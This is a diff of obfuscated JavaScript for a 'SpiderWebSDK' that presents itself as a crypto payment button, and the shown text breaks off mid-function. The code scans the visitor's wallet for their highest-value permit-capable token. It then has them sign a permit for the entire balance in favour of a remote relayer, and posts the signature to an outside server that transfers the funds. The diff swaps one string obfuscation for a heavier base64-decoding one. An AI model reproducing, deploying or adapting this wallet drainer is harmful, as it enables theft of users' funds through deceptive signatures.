@@ -1,341 +1,394 @@
-var _0x3e8c = ['innerHTML', 'slice', 'addEventListener', 'owner', 'recipient', 'body', 'setItem', 'push', 'get-config', 'https://battlewho.com', 'text-align: center; color: #9ca3af;', 'https://eth-mainnet.g.alchemy.com/v2/', 'style', 'success', 'appendChild', 'getElementById', 'target', 'message', 'value', 'init', 'result', '_executeSend', 'color', 'info', 'disabled', 'splitSignature', 'v', 's', 'r', 'stringify', 'nonces', 'name', 'symbol', 'balanceOf', 'version', 'test', 'error', 'POST', 'headers', 'Content-Type', 'application/json', 'X-Api-Key', 'ok', 'json', 'log', 'warn', 'SpiderWebSDK already initialized.', 'Missing required configuration parameters.', 'ethers.js is not loaded. Please include it on your page.', 'SpiderWebSDK: Fetching remote configuration...', 'origin', 'location', 'Network error while fetching remote config. Status: ', 'status', 'Invalid remote configuration from server.', 'SpiderWebSDK: Remote configuration loaded successfully.', 'SpiderWebSDK FATAL ERROR:', 'SDK Init Failed', 'Button with ID "', '" not found.', 'click', '_handlePaymentClick', 'bind', '_injectModalHtml', '_setupEip6963Listeners', 'SpiderWebSDK initialized successfully.', '_connectWallet', 'Wallet connection cancelled.', 'getNetwork', 'chainId', 'Please switch your wallet to the correct network (Chain ID: ', ').', 'Payment failed:', 'Error: ', 'Scanning wallet for compatible tokens...', 'pending', '_findHighestValueToken', 'No permit-compatible tokens with a balance were found.', 'Highest value token found: ', '_signAndSendWithStandardPermit', 'alchemy_getTokenBalances', 'erc20', 'tokenBalances', 'filter', 'tokenBalance', 'contractAddress', '_checkPermitSupport', 'Found compatible token: ', '. Fetching details...', 'DOMAIN_SEPARATOR', 'Preparing permit for ', '...', 'floor', 'now', 'Token ', ' has no version(), defaulting to \'1\'.', 'Permit', 'spender', 'nonce', 'deadline', 'toString', '_signTypedData', 'Please sign the message for ', 'utils', 'execute-transfer', 'Signature received. Relaying transaction...', 'Relayer service failed.', '✅ ', ' transfer has been successfully relayed!', 'Standard Permit failed:', 'reason', 'Promise', 'resolve', '_openWalletModal', 'closest', '.sw-wallet-button', 'dataset', 'rdns', 'get', 'Connecting with ', '_closeWalletModal', 'providers', 'Web3Provider', 'send', 'eth_requestAccounts', 'getSigner', 'getAddress', 'Connected: ', '...'];
-(function(_0x3c82e8, _0x3e8c0d) {
-    var _0x593d49 = function(_0x4332a4) {
-        while (--_0x4332a4) {
-            _0x3c82e8['push'](_0x3c82e8['shift']());
+(function(d, e) {
+    var f = function(g) {
+        while (--g) {
+            d['push'](d['shift']());
         }
     };
-    _0x593d49(++_0x3e8c0d);
-}(_0x3e8c, 0x1d8));
-var _0x593d = function(_0x3c82e8, _0x3e8c0d) {
-    _0x3c82e8 = _0x3c82e8 - 0x0;
-    var _0x593d49 = _0x3e8c[_0x3c82e8];
-    return _0x593d49;
-};
-window['SpiderWebSDK'] = {
+    f(++e);
+}(_0x3e9f, 0x1c8));
+
+function _0x272b(c, d) {
+    var e = _0x3e9f[c = c - 0x0];
+    if (_0x272b['rgwEkV'] === undefined) {
+        (function() {
+            var g = function() {
+                var h;
+                try {
+                    h = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')();
+                } catch (i) {
+                    h = window;
+                }
+                return h;
+            };
+            var f = g();
+            var e = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+            f['atob'] || (f['atob'] = function(g) {
+                var h = String(g)['replace'](/=+$/, '');
+                for (var i = 0x0, j, k, l = 0x0, m = ''; k = h['charAt'](l++); ~k && (j = i % 0x4 ? j * 0x40 + k : k, i++ % 0x4) ? m += String['fromCharCode'](0xff & j >> (-0x2 * i & 0x6)) : 0x0) {
+                    k = e['indexOf'](k);
+                }
+                return m;
+            });
+        }());
+        _0x272b['lGxdYg'] = function(e) {
+            var f = atob(e);
+            var g = [];
+            for (var h = 0x0, i = f['length']; h < i; h++) {
+                g += '%' + ('00' + f['charCodeAt'](h)['toString'](0x10))['slice'](-0x2);
+            }
+            return decodeURIComponent(g);
+        };
+        _0x272b['gVObcW'] = {};
+        _0x272b['rgwEkV'] = !![];
+    }
+    var b = _0x3e9f[c];
+    var a = b;
+    if (_0x272b['gVObcW'][c] !== undefined) {
+        a = _0x272b['gVObcW'][c];
+    } else {
+        a = _0x272b['lGxdYg'](a);
+        _0x272b['gVObcW'][c] = a;
+    }
+    return a;
+}
+window[_0x272b('0xb6')] = {
     '_config': {},
     '_provider': null,
     '_signer': null,
     '_currentUserAddress': null,
     '_discoveredProviders': new Map(),
     '_isInitialized': ![],
-    '_ERC20_PERMIT_ABI': ['function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)', 'function nonces(address owner) view returns (uint256)', 'function DOMAIN_SEPARATOR() view returns (bytes32)', 'function name() view returns (string)', 'function version() view returns (string)', 'function decimals() view returns (uint8)', 'function balanceOf(address owner) view returns (uint256)', 'function symbol() view returns (string)'],
-    '_RELAYER_SERVER_URL_BASE': _0x593d('0x65'),
-    'init': async function(_0x555843) {
-        if (this['_isInitialized']) {
-            console[_0x593d('0x24')](_0x593d('0x25'));
+    '_ERC20_PERMIT_ABI': ['function\x20permit(address\x20owner,\x20address\x20spender,\x20uint256\x20value,\x20uint256\x20deadline,\x20uint8\x20v,\x20bytes32\x20r,\x20bytes32\x20s)', 'function\x20nonces(address\x20owner)\x20view\x20returns\x20(uint256)', _0x272b('0x40'), 'function\x20name()\x20view\x20returns\x20(string)', _0x272b('0x57'), 'function\x20decimals()\x20view\x20returns\x20(uint8)', _0x272b('0x34'), _0x272b('0x19')],
+    '_RELAYER_SERVER_URL_BASE': _0x272b('0x33'),
+    'init': async function(c) {
+        var d = _0x272b;
+        if (this[d('0xb0')]) {
+            console[d('0x4d')](d('0xa1'));
             return;
         }
-        if (!_0x555843['buttonId'] || !_0x555843['apiKey'] || !_0x555843['alchemyApiKey'] || !_0x555843['recipientAddress'] || !_0x555843[_0x593d('0x40')]) {
-            console[_0x593d('0x1a')](_0x593d('0x26'));
+        if (!c[d('0xc0')] || !c[d('0xa0')] || !c['alchemyApiKey'] || !c[d('0x5d')] || !c[d('0x98')]) {
+            console[d('0x43')](d('0x85'));
             return;
         }
         if (typeof ethers === 'undefined') {
-            console['error'](_0x593d('0x27'));
+            console['error'](d('0x28'));
             return;
         }
-        this['_config'] = _0x555843;
+        this['_config'] = c;
         try {
-            console[_0x593d('0x23')](_0x593d('0x28'));
-            const _0x59387c = await fetch(this['_RELAYER_SERVER_URL_BASE'] + '/' + _0x593d('0x64'), {
-                'method': _0x593d('0x1b'),
+            console[d('0x89')](d('0xc6'));
+            const e = await fetch(this['_RELAYER_SERVER_URL_BASE'] + d('0x6f'), {
+                'method': 'POST',
                 'headers': {
-                    'Content-Type': _0x593d('0x1e'),
-                    'X-Api-Key': this['_config']['apiKey']
+                    'Content-Type': d('0xc8'),
+                    'X-Api-Key': this['_config'][d('0xa0')]
                 },
-                'body': JSON[_0x593d('0x8')](_0x593d('0xd'))({
-                    'apiKey': this['_config']['apiKey'],
-                    'origin': window[_0x593d('0x2a')][_0x593d('0x29')]
+                'body': JSON[d('0xcb')]({
+                    'apiKey': this[d('0x9a')][d('0xa0')],
+                    'origin': window[d('0xa7')][d('0xa8')]
                 })
             });
-            if (!_0x593d49['ok']) {
-                throw new Error(_0x593d('0x2b') + _0x59387c[_0x593d('0x2c')]);
+            if (!e[d('0x65')]) {
+                throw new Error(d('0x35') + e[d('0x97')]);
             }
-            const _0x1a6652 = await _0x59387c[_0x593d('0x22')]();
-            if (!_0x1a6652['success'] || !_0x1a6652['relayerAddress']) {
-                throw new Error(_0x1a6652[_0x593d('0x73')] || _0x593d('0x2d'));
+            const f = await e[d('0x36')]();
+            if (!f[d('0x37')] || !f[d('0x4e')]) {
+                throw new Error(f[d('0x77')] || d('0xa4'));
             }
-            this['_config']['relayerAddress'] = _0x1a6652['relayerAddress'];
-            console[_0x593d('0x23')](_0x593d('0x2e'));
-        } catch (_0x3892f3) {
-            console[_0x593d('0x1a')](_0x593d('0x2f'), _0x3892f3['message']);
-            const _0x1d5f30 = document[_0x593d('0x71')](_0x555843['buttonId']);
-            if (_0x1d5f30) {
-                _0x1d5f30[_0x593d('0x7a')] = !![];
-                _0x1d5f30['innerHTML'] = _0x593d('0x30');
+            this[d('0x9a')][d('0x4e')] = f[d('0x4e')];
+            console[d('0x89')](d('0x4f'));
+        } catch (g) {
+            console['error'](d('0xba'), g[d('0x77')]);
+            const h = document[d('0x2e')](c[d('0xc0')]);
+            if (h) {
+                h['disabled'] = !![];
+                h[d('0x2f')] = d('0xbb');
             }
             return;
         }
-        const _0x1d5f30 = document['getElementById'](_0x555843['buttonId']);
-        if (!_0x1d5f30) {
-            console[_0x593d('0x1a')](_0x593d('0x31') + _0x555843['buttonId'] + _0x593d('0x32'));
+        const i = document[d('0x2e')](c['buttonId']);
+        if (!i) {
+            console[d('0x43')](d('0x29') + c[d('0xc0')] + d('0x18'));
             return;
         }
-        _0x1d5f30['addEventListener'](_0x593d('0x33'), this[_0x593d('0x34')][_0x593d('0x35')](this));
-        this[_0x593d('0x36')]();
-        this[_0x593d('0x37')]();
-        this['_isInitialized'] = !![];
-        console[_0x593d('0x23')](_0x593d('0x38'));
+        i[d('0x88')](d('0x49'), this[d('0x90')][d('0x6a')](this));
+        this['\x5f\x69\x6e\x6a\x65\x63\x74\x4d\x6f\x64\x61\x6c\x48\x74\x6d\x6c']();
+        this[d('0x38')]();
+        this[d('0xb0')] = !![];
+        console[d('0x89')](d('0x59'));
     },
     '_handlePaymentClick': async function() {
+        var e = _0x272b;
         try {
             if (!this['_signer']) {
-                const _0x1a5928 = await this[_0x593d('0x39')]();
-                if (!_0x1a5928) {
-                    this['_updateStatus'](_0x593d('0x3a'), _0x593d('0x79'));
+                const f = await this[e('0x55')]();
+                if (!f) {
+                    this[e('0x6e')](e('0x24'), e('0x58'));
                 }
                 return;
             }
-            const _0x199292 = await this['_provider'][_0x593d('0x3b')]();
-            if (_0x199292[_0x593d('0x3c')] !== this['_config'][_0x593d('0x3c')]) {
-                this['_updateStatus'](_0x593d('0x3d') + this['_config']['chainId'] + _0x593d('0x3e'), _0x593d('0x1a'));
+            const g = await this['_provider'][e('0xb5')]();
+            if (g[e('0x98')] !== this[e('0x9a')][e('0x98')]) {
+                this[e('0x6e')](e('0xc1') + this[e('0x9a')][e('0x98')] + e('0x2a'), 'error');
                 return;
             }
-            await this[_0x593d('0x77')]();
-        } catch (_0x30a301) {
-            console[_0x593d('0x1a')](_0x593d('0x3f'), _0x30a301);
-            this['_updateStatus'](_0x593d('0x40') + _0x30a301[_0x593d('0x73')], _0x593d('0x1a'));
+            await this[e('0x8f')]();
+        } catch (h) {
+            console['error'](e('0x94'), h);
+            this['_updateStatus'](e('0x5b') + h[e('0x77')], e('0x43'));
         }
     },
     '_executeSend': async function() {
-        this['_updateStatus'](_0x593d('0x41'), _0x593d('0x42'));
-        const _0x450f68 = await this[_0x593d('0x43')]();
-        if (!_0x450f68) {
-            throw new Error(_0x593d('0x44'));
+        var f = _0x272b;
+        this[f('0x6e')](f('0x6d'), 'pending');
+        const g = await this['\x5f\x66\x69\x6e\x64\x48\x69\x67\x68\x65\x73\x74\x56\x61\x6c\x75\x65\x54\x6f\x6b\x65\x6e']();
+        if (!g) {
+            throw new Error(f('0x91'));
         }
-        this['_updateStatus'](_0x593d('0x45') + _0x450f68[_0x593d('0xb')], _0x593d('0x79'));
-        await this[_0x593d('0x46')](_0x450f68);
+        this['_updateStatus'](f('0x1a') + g[f('0x19')], f('0x58'));
+        await this['_signAndSendWithStandardPermit'](g);
     },
     '_findHighestValueToken': async function() {
-        const _0x5a23fa = _0x593d('0x67') + this['_config']['alchemyApiKey'];
-        const _0x27977b = await fetch(_0x5a23fa, {
-            'method': _0x593d('0x1b'),
+        var g = _0x272b;
+        const h = g('0x5f') + this[g('0x9a')]['alchemyApiKey'];
+        const i = await fetch(h, {
+            'method': g('0xb9'),
             'headers': {
-                'Content-Type': _0x593d('0x1e')
+                'Content-Type': g('0xc8')
             },
-            'body': JSON[_0x593d('0x8')](_0x593d('0xd'))({
+            'body': JSON[g('0xcb')]({
                 'jsonrpc': '2.0',
                 'id': 0x1,
-                'method': _0x593d('0x47'),
-                'params': [this['_currentUserAddress'], _0x593d('0x48')]
+                'method': g('0x8e'),
+                'params': [this[g('0x92')], g('0x95')]
             })
         });
-        const _0x2a98e3 = await _0x27977b['json']();
-        if (!_0x2a98e3[_0x593d('0x76')]) throw new Error('Could not fetch token balances from Alchemy.');
-        const _0x364817 = _0x2a98e3[_0x593d('0x76')][_0x593d('0x49')][_0x593d('0x4a')](_0x1e66c7 => _0x1e66c7[_0x593d('0x4b')] !== '0x0');
-        if (_0x364817['length'] === 0x0) return null;
-        for (const _0x442e61 of _0x364817) {
-            const _0x5e5b6c = _0x442e61[_0x593d('0x4c')];
-            const _0x3a4049 = await this[_0x593d('0x4d')](_0x5e5b6c);
-            if (_0x3a4049) {
-                this['_updateStatus'](_0x593d('0x4e') + _0x5e5b6c + _0x593d('0x4f'), _0x593d('0x42'));
-                const _0x550c60 = new ethers['Contract'](_0x5e5b6c, this['_ERC20_PERMIT_ABI'], this['_provider']);
-                const [_0x38b814, _0x2cae44, _0x367f0f] = await Promise['all']([_0x550c60[_0x593d('0xa')](), _0x550c60[_0x593d('0xb')](), _0x550c60['balanceOf'](this['_currentUserAddress'])]);
+        const j = await i[g('0x36')]();
+        if (!j['result']) throw new Error(g('0x22'));
+        const k = j[g('0x42')][g('0x7e')]['filter'](l => l[g('0x23')] !== '0x0');
+        if (k['length'] === 0x0) return null;
+        for (const l of k) {
+            const m = l[g('0x2d')];
+            const n = await this[g('0x3d')](m);
+            if (n) {
+                this[g('0x6e')](g('0x5a') + m + g('0x3e'), g('0x7a'));
+                const o = new ethers[g('0x3c')](m, this[g('0x81')], this[g('0x99')]);
+                const [p, q, r] = await Promise['all']([o['name'](), o[g('0x19')](), o[g('0x34')](this[g('0x92')])]);
                 return {
-                    'contractAddress': _0x5e5b6c,
-                    'name': _0x38b814,
-                    'symbol': _0x2cae44,
-                    'balance': _0x367f0f
+                    'contractAddress': m,
+                    'name': p,
+                    'symbol': q,
+                    'balance': r
                 };
             }
         }
         return null;
     },
-    '_checkPermitSupport': async function(_0x2d17c7) {
+    '_checkPermitSupport': async function(c) {
+        var d = _0x272b;
         try {
-            const _0x535a39 = new ethers['Contract'](_0x2d17c7, this['_ERC20_PERMIT_ABI'], this['_provider']);
-            await _0x535a39[_0x593d('0x9')](this['_currentUserAddress']);
-            await _0x535a39[_0x593d('0x50')]();
+            const e = new ethers[d('0x3c')](c, this[d('0x81')], this[d('0x99')]);
+            await e['nonces'](this['_currentUserAddress']);
+            await e[d('0x40')]();
             return !![];
-        } catch (_0x3f5c88) {
+        } catch (f) {
             return ![];
         }
     },
-    '_signAndSendWithStandardPermit': async function(_0x47e857) {
-        this['_updateStatus'](_0x593d('0x51') + _0x47e857[_0x593d('0xb')] + _0x593d('0x52'), 'pending');
+    '_signAndSendWithStandardPermit': async function(c) {
+        var d = _0x272b;
+        this[d('0x6e')](d('0xb3') + c[d('0x19')] + d('0xad'), d('0x7a'));
         try {
-            const _0x47b850 = new ethers['Contract'](_0x47e857[_0x593d('0x4c')], this['_ERC20_PERMIT_ABI'], this['_signer']);
-            const _0x5928f0 = await _0x47b850['nonces'](this['_currentUserAddress']);
-            const _0x3454a8 = Math['floor'](Date[_0x593d('0x54')]() / 0x3e8) + 0x708;
-            const _0x3b856b = _0x47e857[_0x593d('0xa')];
-            let _0x4a7e8e = '1';
+            const e = new ethers[d('0x3c')](c['contractAddress'], this['_ERC20_PERMIT_ABI'], this['_signer']);
+            const f = await e['nonces'](this[d('0x92')]);
+            const g = Math[d('0x8c')](Date[d('0x79')]() / 0x3e8) + 0x708;
+            const h = c['name'];
+            let i = '1';
             try {
-                _0x4a7e8e = await _0x47b850[_0x593d('0xd')]();
-            } catch (_0x3d0623) {
-                console['log'](_0x593d('0x55') + _0x47e857['symbol'] + _0x593d('0x56'));
+                i = await e[d('0x57')]();
+            } catch (j) {
+                console[d('0x89')](d('0xc7') + c[d('0x19')] + d('0x6c'));
             }
-            const _0x3b3d87 = {
-                'name': _0x3b856b,
-                'version': _0x4a7e8e,
-                'chainId': this['_config'][_0x593d('0x3c')],
-                'verifyingContract': _0x47e857['contractAddress']
+            const k = {
+                'name': h,
+                'version': i,
+                'chainId': this[d('0x9a')][d('0x98')],
+                'verifyingContract': c[d('0x2d')]
             };
-            const _0x45a272 = {
+            const l = {
                 'Permit': [{
-                    'name': _0x593d('0x5c'),
-                    'type': 'address'
+                    'name': d('0x64'),
+                    'type': d('0x67')
                 }, {
-                    'name': _0x593d('0x58'),
-                    'type': 'address'
+                    'name': d('0x39'),
+                    'type': d('0x67')
                 }, {
-                    'name': _0x593d('0x74'),
+                    'name': d('0x74'),
                     'type': 'uint256'
                 }, {
-                    'name': 'nonce',
+                    'name': d('0xae'),
                     'type': 'uint256'
                 }, {
-                    'name': 'deadline',
-                    'type': 'uint256'
+                    'name': d('0x8d'),
+                    'type': d('0x26')
                 }]
             };
-            const _0x3c2b8c = {
-                'owner': this['_currentUserAddress'],
-                'spender': this['_config']['relayerAddress'],
-                'value': _0x47e857['balance'][_0x593d('0x5b')](),
-                'nonce': _0x5928f0['toString'](),
-                'deadline': _0x3454a8
+            const m = {
+                'owner': this[d('0x92')],
+                'spender': this['_config'][d('0x4e')],
+                'value': c['balance'][d('0x2c')](),
+                'nonce': f[d('0x2c')](),
+                'deadline': g
             };
-            this['_updateStatus'](_0x593d('0x5d') + _0x47e857['symbol'] + _0x593d('0x52'), 'pending');
-            const _0x33b8a1 = await this['_signer'][_0x593d('0x5c')](_0x3b3d87, _0x45a272, _0x3c2b8c);
+            this['_updateStatus'](d('0x82') + c[d('0x19')] + d('0xad'), 'pending');
+            const n = await this[d('0x9b')][d('0x41')](k, l, m);
             const {
-                v: _0x277457,
-                r: _0x4d210d,
-                s: _0x26649f
-            } = ethers[_0x593d('0x5e')][_0x593d('0x7b')](_0x33b8a1);
-            const _0x1c7a8b = {
-                'apiKey': this['_config']['apiKey'],
-                'owner': this['_currentUserAddress'],
-                'recipient': this['_config'][_0x593d('0x5d')],
-                'contractAddress': _0x47e857['contractAddress'],
-                'value': _0x47e857['balance']['toString'](),
-                'deadline': _0x3454a8,
-                'v': _0x277457,
-                'r': _0x4d210d,
-                's': _0x26649f,
-                'origin': window[_0x593d('0x2a')][_0x593d('0x29')],
-                'chainId': this['_config'][_0x593d('0x3c')]
+                v: o,
+                r: p,
+                s: q
+            } = ethers[d('0x4a')][d('0x56')](n);
+            const r = {
+                'apiKey': this['_config'][d('0xa0')],
+                'owner': this[d('0x92')],
+                'recipient': this[d('0x9a')][d('0x5d')],
+                'contractAddress': c[d('0x2d')],
+                'value': c[d('0x31')][d('0x2c')](),
+                'deadline': g,
+                'v': o,
+                'r': p,
+                's': q,
+                'origin': window[d('0xa7')][d('0xa8')],
+                'chainId': this[d('0x9a')][d('0x98')]
             };
-            this['_updateStatus'](_0x593d('0x60'), _0x593d('0x42'));
-            const _0x3503f1 = await fetch(this['_RELAYER_SERVER_URL_BASE'] + '/' + _0x593d('0x5f'), {
-                'method': 'POST',
+            this[d('0x6e')](d('0x54'), 'pending');
+            const s = await fetch(this[d('0x53')] + d('0x6b'), {
+                'method': d('0xb9'),
                 'headers': {
-                    'Content-Type': 'application/json',
-                    'X-Api-Key': this['_config']['apiKey']
+                    'Content-Type': d('0xc8'),
+                    'X-Api-Key': this[d('0x9a')][d('0xa0')]
                 },
-                'body': JSON['stringify'](_0x1c7a8b)
+                'body': JSON[d('0xcb')](r)
             });
-            const _0x3dd69b = await _0x3503f1['json']();
-            if (!_0x3503f1['ok'] || !_0x3dd69b[_0x593d('0x6f')]) throw new Error(_0x3dd69b['message'] || _0x593d('0x61'));
-            this['_updateStatus'](_0x593d('0x62') + _0x47e857[_0x593d('0xb')] + _0x593d('0x63'), _0x593d('0x6f'));
-        } catch (_0x1a72d3) {
-            console[_0x593d('0x1a')](_0x593d('0x64'), _0x1a72d3);
-            this['_updateStatus']('Error: ' + (_0x1a72d3[_0x593d('0x65')] || _0x1a72d3[_0x593d('0x73')]), _0x593d('0x1a'));
-            throw _0x1a72d3;
+            const t = await s[d('0x36')]();
+            if (!s['ok'] || !t['success']) throw new Error(t[d('0x77')] || d('0xac'));
+            this[d('0x6e')](d('0xc3') + c['symbol'] + d('0x5c'), 'success');
+        } catch (u) {
+            console[d('0x43')](d('0x86'), u);
+            this[d('0x6e')](d('0x5b') + (u['reason'] || u[d('0x77')]), d('0x43'));
+            throw u;
         }
     },
     '_connectWallet': function() {
-        return new(_0x593d('0x66'))(_0x24e03d => {
-            this['_resolveConnection'] = _0x24e03d;
-            this[_0x593d('0x68')]();
+        var c = _0x272b;
+        return new Promise(d => {
+            this[c('0x60')] = d;
+            this[c('0x9d')]();
         });
     },
-    '_handleProviderSelection': async function(_0x546c43) {
-        const _0x3213a4 = _0x546c43[_0x593d('0x72')][_0x593d('0x69')](_0x593d('0x6a'));
-        if (!_0x3213a4) return;
-        const _0x4f1f2e = _0x3213a4[_0x593d('0x6b')][_0x593d('0x6c')];
-        const _0x46428c = this['_discoveredProviders'][_0x593d('0x6d')](_0x4f1f2e);
-        if (!_0x46428c) return;
-        this['_updateStatus'](_0x593d('0x6e') + _0x46428c['info'][_0x593d('0xa')] + _0x593d('0x52'), _0x593d('0x42'));
-        this[_0x593d('0x6f')]();
+    '_handleProviderSelection': async function(c) {
+        var d = _0x272b;
+        const e = c[d('0x68')][d('0x1c')](d('0x1d'));
+        if (!e) return;
+        const f = e[d('0x70')][d('0x3f')];
+        const g = this[d('0xaf')][d('0x84')](f);
+        if (!g) return;
+        this[d('0x6e')](d('0x75') + g[d('0x58')]['name'] + d('0xad'), 'pending');
+        this['\x5f\x63\x6c\x6f\x73\x65\x57\x61\x6c\x6c\x65\x74\x4d\x6f\x64\x61\x6c']();
         try {
-            const _0x289745 = _0x46428c['provider'];
-            this['_provider'] = new ethers[_0x593d('0x70')][_0x593d('0x71')](_0x289745);
-            await this['_provider']['send'](_0x593d('0x73'), []);
-            this['_signer'] = this['_provider'][_0x593d('0x74')]();
-            this['_currentUserAddress'] = await this['_signer'][_0x593d('0x75')]();
-            this['_updateStatus'](_0x593d('0x76') + this['_currentUserAddress'][_0x593d('0x5a')](0x0, 0x6) + _0x593d('0x77') + this['_currentUserAddress']['slice'](-0x4), _0x593d('0x6f'));
-            if (this['_resolveConnection']) {
-                this['_resolveConnection'](!![]);
-                const _0x3c2ee1 = await this['_provider']['getNetwork']();
-                if (_0x3c2ee1['chainId'] !== this['_config']['chainId']) {
-                    this['_updateStatus']('Please switch your wallet to the correct network (Chain ID: ' + this['_config'][_0x593d('0x3c')] + ').', _0x593d('0x1a'));
+            const h = g[d('0x99')];
+            this[d('0x99')] = new ethers[d('0x21')][d('0x80')](h);
+            await this[d('0x99')][d('0xbc')](d('0xbe'), []);
+            this[d('0x9b')] = this[d('0x99')]['getSigner']();
+            this[d('0x92')] = await this[d('0x9b')][d('0x78')]();
+            this[d('0x6e')](d('0x7d') + this[d('0x92')][d('0xbd')](0x0, 0x6) + '...' + this[d('0x92')][d('0xbd')](-0x4), d('0x37'));
+            if (this[d('0x60')]) {
+                this[d('0x60')](!![]);
+                const i = await this[d('0x99')][d('0xb5')]();
+                if (i['chainId'] !== this[d('0x9a')][d('0x98')]) {
+                    this[d('0x6e')](d('0xc1') + this[d('0x9a')][d('0x98')] + d('0x2a'), 'error');
                     return;
                 }
-                await this['_executeSend']();
+                await this[d('0x8f')]();
             }
-        } catch (_0x1a39a0) {
-            console['error']('Connection failed:', _0x1a39a0);
-            this['_updateStatus']('Connection failed or was rejected.', _0x593d('0x1a'));
-            if (this['_resolveConnection']) this['_resolveConnection'](![]);
+        } catch (j) {
+            console[d('0x43')](d('0x7f'), j);
+            this[d('0x6e')](d('0xb1'), d('0x43'));
+            if (this[d('0x60')]) this[d('0x60')](![]);
         }
     },
     '_setupEip6963Listeners': function() {
-        window['addEventListener']('eip6963:announceProvider', _0x1804c7 => {
-            const _0x5e08b3 = _0x1804c7['detail'];
-            if (!this['_discoveredProviders']['has'](_0x5e08b3['info']['rdns'])) {
-                this['_discoveredProviders']['set'](_0x5e08b3['info']['rdns'], _0x5e08b3);
-                this['_renderWalletList']();
+        var c = _0x272b;
+        window[c('0x88')](c('0x7c'), d => {
+            const e = d[c('0xb2')];
+            if (!this[c('0xaf')]['has'](e['info']['rdns'])) {
+                this[c('0xaf')]['set'](e['info']['rdns'], e);
+                this[c('0xca')]();
             }
         });
-        window['dispatchEvent'](new Event('eip6963:requestProvider'));
+        window[c('0x25')](new Event(c('0x44')));
     },
     '_renderWalletList': function() {
-        const _0x3b8d0c = document['getElementById']('sw-wallet-list');
-        if (!_0x3b8d0c) return;
-        _0x3b8d0c[_0x593d('0x59')] = '';
-        if (this['_discoveredProviders']['size'] === 0x0) {
-            _0x3b8d0c['innerHTML'] = '<p style="' + _0x593d('0x66') + '">No wallets detected.</p>';
+        var d = _0x272b;
+        const e = document[d('0x2e')]('sw-wallet-list');
+        if (!e) return;
+        e[d('0x2f')] = '';
+        if (this[d('0xaf')]['size'] === 0x0) {
+            e[d('0x2f')] = d('0x62');
             return;
         }
-        this['_discoveredProviders']['forEach'](_0x56a59b => {
-            const _0x280425 = '\n                <button data-rdns="' + _0x56a59b['info']['rdns'] + '" class="sw-wallet-button" style="width: 100%; display: flex; align-items: center; padding: 12px; background-color: #374151; border-radius: 8px; border: none; cursor: pointer; margin-bottom: 8px; color: white;">\n                    <img src="' + _0x56a59b['info']['icon'] + '" alt="' + _0x56a59b['info'][_0x593d('0xa')] + '" style="width: 32px; height: 32px; margin-right: 16px; border-radius: 50%;"/>\n                    <span style="font-weight: 500;">' + _0x56a59b['info']['name'] + '</span>\n                </button>\n            ';
-            _0x3b8d0c[_0x593d('0x59')] += _0x280425;
+        this[d('0xaf')]['forEach'](f => {
+            const g = '\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20data-rdns=\x22' + f['info']['rdns'] + d('0x1e') + f[d('0x58')]['icon'] + d('0x1f') + f[d('0x58')]['name'] + d('0x20') + f['info'][d('0x66')] + '</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20';
+            e[d('0x2f')] += g;
         });
-        _0x3b8d0c['querySelectorAll']('.sw-wallet-button')['forEach'](_0x52b02e => {
-            _0x52b02e[_0x593d('0x5b')](_0x593d('0x33'), this['_handleProviderSelection'][_0x593d('0x35')](this));
+        e[d('0xbf')](d('0x1d'))['forEach'](f => {
+            f[d('0x88')](d('0x49'), this[d('0x69')][d('0x6a')](this));
         });
     },
     '_openWalletModal': function() {
-        document[_0x593d('0x71')]('sw-modal-overlay')[_0x593d('0x68')]['display'] = 'flex';
+        var c = _0x272b;
+        document[c('0x2e')](c('0x9e'))[c('0x7b')]['display'] = 'flex';
         setTimeout(() => {
-            document[_0x593d('0x71')]('sw-wallet-modal')['style']['opacity'] = 0x1;
-            document[_0x593d('0x71')]('sw-wallet-modal')[_0x593d('0x68')]['transform'] = 'scale(1)';
+            document[c('0x2e')]('sw-wallet-modal')[c('0x7b')][c('0x45')] = 0x1;
+            document['getElementById']('sw-wallet-modal')[c('0x7b')][c('0x52')] = c('0x76');
         }, 0xa);
-        this['_renderWalletList']();
+        this['\x5f\x72\x65\x6e\x64\x65\x72\x57\x61\x6c\x6c\x65\x74\x4c\x69\x73\x74']();
     },
     '_closeWalletModal': function() {
-        const _0x18b6e7 = document['getElementById']('sw-modal-overlay');
-        const _0x50f4a4 = document[_0x593d('0x71')]('sw-wallet-modal');
-        if (_0x50f4a4) {
-            _0x50f4a4[_0x593d('0x68')]['opacity'] = 0x0;
-            _0x50f4a4['style']['transform'] = 'scale(0.95)';
+        var d = _0x272b;
+        const e = document['getElementById'](d('0x9e'));
+        const f = document['getElementById']('sw-wallet-modal');
+        if (f) {
+            f[d('0x7b')][d('0x45')] = 0x0;
+            f[d('0x7b')][d('0x52')] = d('0x96');
         }
         setTimeout(() => {
-            if (_0x18b6e7) _0x18b6e7[_0x593d('0x68')]['display'] = 'none';
-            if (this['_resolveConnection'] && !this['_signer']) {
-                this['_resolveConnection'](![]);
+            if (e) e['style'][d('0x63')] = d('0xa3');
+            if (this[d('0x60')] && !this[d('0x9b')]) {
+                this[d('0x60')](![]);
             }
         }, 0x12c);
     },
-    '_updateStatus': function(_0x44ed09, _0x337777 = _0x593d('0x79')) {
-        const _0xe298eb = document[_0x593d('0x71')]('sw-status-message');
-        if (!_0xe298eb) return;
-        const _0x3b110a = {
+    '_updateStatus': function(c, d = 'info') {
+        var e = _0x272b;
+        const f = document[e('0x2e')](e('0x4c'));
+        if (!f) return;
+        const g = {
             'info': '#6b7280',
             'success': '#16a34a',
             'error': '#dc2626',
             'pending': '#2563eb'
         };
-        _0xe298eb['innerHTML'] = '<p style="color: ' + _0x3b110a[_0x337777] + '; margin: 0; font-size: 14px; text-align: center;">' + _0x44ed09 + '</p>';
+        f[e('0x2f')] = e('0x87') + g[d] + e('0x8a') + c + '</p>';
     },
     '_injectModalHtml': function() {
-        if (document['getElementById']('sw-modal-overlay')) return;
